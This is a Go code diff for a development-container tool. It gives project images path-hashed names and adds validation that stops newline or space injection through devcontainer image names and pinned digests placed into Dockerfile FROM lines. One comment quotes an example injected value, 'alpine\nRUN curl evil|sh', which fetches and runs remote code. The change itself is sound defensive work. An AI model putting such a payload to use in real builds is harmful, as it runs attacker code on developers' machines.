@@ -129,8 +129,15 @@ func Resolve(dir string, cfg config.Config, set *langs.Set) (*Project, error) {
 	// is the other one. Without this the second person silently reuses a
 	// cached image they cannot write the workspace with, which is the exact
 	// failure the uid work exists to remove.
-	p.Image = fmt.Sprintf("%s-img-%s%s", prefix, name, imageUIDSuffix())
-	p.Container = fmt.Sprintf("%s-ctn-%s", prefix, name)
+	// The path hash disambiguates two different directories that happen to
+	// share a basename. Without it both resolve to the same image tag, and
+	// once one is built the other reuses it — running its own workspace,
+	// grants and agent login against the first project's baked-in code. The
+	// trust store already keys on the full path for exactly this reason;
+	// the image name did not, and a review reached A's image from B.
+	id := PathID(dir)
+	p.Image = fmt.Sprintf("%s-img-%s-%s%s", prefix, name, id, imageUIDSuffix())
+	p.Container = fmt.Sprintf("%s-ctn-%s-%s", prefix, name, id)
 	// Ports come from the user's configuration or from detection, never
 	// from the repository. `.devenv.yaml` cannot set forward_ports and a
 	// devcontainer's forwardPorts is not read either (see Ignored): both
@@ -197,8 +204,16 @@ func (p *Project) RenderedDockerfile() (string, error) {
 		return string(raw), nil
 	}
 	if p.DevcontainerImage != "" {
-		// A devcontainer naming an image needs no Dockerfile: the image
-		// is the environment.
+		// A devcontainer naming an image needs no Dockerfile: the image is
+		// the environment. Validated first, because this string comes
+		// straight from a repository's `.devcontainer.json` and is
+		// concatenated into a FROM line — a value like
+		// "alpine\nRUN curl evil|sh" would inject an instruction into a
+		// build the tool treats as trusted-generated and never asks about.
+		if !validImageRef(p.DevcontainerImage) {
+			return "", fmt.Errorf("project: devcontainer image %q is not a valid "+
+				"image reference", p.DevcontainerImage)
+		}
 		return "FROM " + p.DevcontainerImage + "\n", nil
 	}
 	if !p.Detected.Found() {
@@ -411,6 +426,45 @@ func BaseImages(dockerfile string) []string {
 	return out
 }
 
+// PathID is a short, stable identifier for a project directory, derived
+// from its canonical absolute path. It is what keeps two directories that
+// share a basename — two checkouts both called `project`, a fork beside its
+// original — from sharing an image tag, a container name, a network or a
+// clone directory. Symlinks are resolved so the same directory reached two
+// ways is one id.
+func PathID(dir string) string {
+	canonical := dir
+	if abs, err := filepath.Abs(dir); err == nil {
+		canonical = abs
+	}
+	if resolved, err := filepath.EvalSymlinks(canonical); err == nil {
+		canonical = resolved
+	}
+	sum := sha256.Sum256([]byte(canonical))
+	return hex.EncodeToString(sum[:4])
+}
+
+// validImageRef reports whether s is a single docker image reference and
+// nothing more — no whitespace, no control characters, no second line. It
+// is deliberately conservative about shape rather than a full reference
+// grammar: the point is that the value cannot carry a newline or a space
+// into a FROM line and become a second instruction, which is the injection
+// it guards, not to certify every legal-but-exotic reference.
+func validImageRef(s string) bool {
+	if s == "" || len(s) > 512 {
+		return false
+	}
+	for _, r := range s {
+		switch {
+		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
+		case r == '.' || r == '-' || r == '_' || r == '/' || r == ':' || r == '@':
+		default:
+			return false
+		}
+	}
+	return true
+}
+
 // ApplyPins rewrites FROM lines to the digests they were pinned to. A tag
 // says which image you meant; a digest says which image you got.
 func ApplyPins(dockerfile string, pins map[string]string) string {
@@ -425,6 +479,14 @@ func ApplyPins(dockerfile string, pins map[string]string) string {
 		}
 		digest, ok := pins[fields[1]]
 		if !ok || digest == "" {
+			continue
+		}
+		// A pin value goes verbatim into a FROM line, so a multiline or
+		// space-bearing value would inject its own Dockerfile instructions
+		// — `RUN …` on a second line — into an otherwise trusted build. A
+		// pin is one image reference; anything else is left unapplied, and
+		// the original tag stands.
+		if !validImageRef(digest) {
 			continue
 		}
 		// Keep the original as a comment: a bare digest tells a reader
